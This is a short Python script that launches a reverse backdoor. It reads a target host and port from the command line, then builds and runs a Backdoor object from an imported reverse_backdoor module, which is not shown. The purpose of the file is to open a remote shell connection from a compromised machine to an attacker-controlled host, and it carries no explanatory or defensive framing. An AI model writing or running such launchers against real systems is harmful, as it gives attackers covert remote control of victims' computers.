import reverse_backdoor, optparse


def get_arguments():
  parser = optparse.OptionParser()
  parser.add_option("-t", "--target", dest="IP", help="[+] Specify the host")
  parser.add_option("-p", "--port", dest="Port", help="[+] Specify the port")
  (options, arguments) = parser.parse_args()
  if not options.IP:
    parser.error("[-] Please, specify the target host")
  if not options.Port:
    parser.error("[-] Please, specify the target port")
  return options

data = get_arguments()
my_backdoor = reverse_backdoor.Backdoor(data.IP, int(data.Port))
my_backdoor.run()